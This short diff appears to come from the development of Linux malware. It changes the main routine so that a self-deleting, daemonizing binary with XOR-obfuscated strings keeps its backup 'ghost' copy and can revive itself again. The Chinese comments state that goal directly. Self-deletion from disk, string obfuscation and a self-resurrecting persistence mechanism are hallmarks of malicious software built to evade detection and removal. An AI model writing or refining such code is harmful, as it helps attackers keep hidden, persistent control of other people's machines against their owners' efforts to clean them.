@@ -1259,13 +1259,18 @@ int main(int argc, char *argv[])
     if (!is_ghost)
         backup_self();
 
-    /* 通过 /proc/self/exe 获取真实路径来 unlink */
-    char exe_path[256] = {0};
-    int n = readlink(XorString("/proc/self/exe"), exe_path, sizeof(exe_path) - 1);
-    if (n > 0)
+    /* 通过 /proc/self/exe 获取真实路径来 unlink
+     * ghost 重启时不 unlink——因为 exe_path 就是 GHOST_PATH 本身，
+     * 删除它会导致后续无法再次复活 */
+    if (!is_ghost)
     {
-        exe_path[n] = '\0';
-        unlink(exe_path);
+        char exe_path[256] = {0};
+        int n = readlink(XorString("/proc/self/exe"), exe_path, sizeof(exe_path) - 1);
+        if (n > 0)
+        {
+            exe_path[n] = '\0';
+            unlink(exe_path);
+        }
     }
 
     init_deamon();
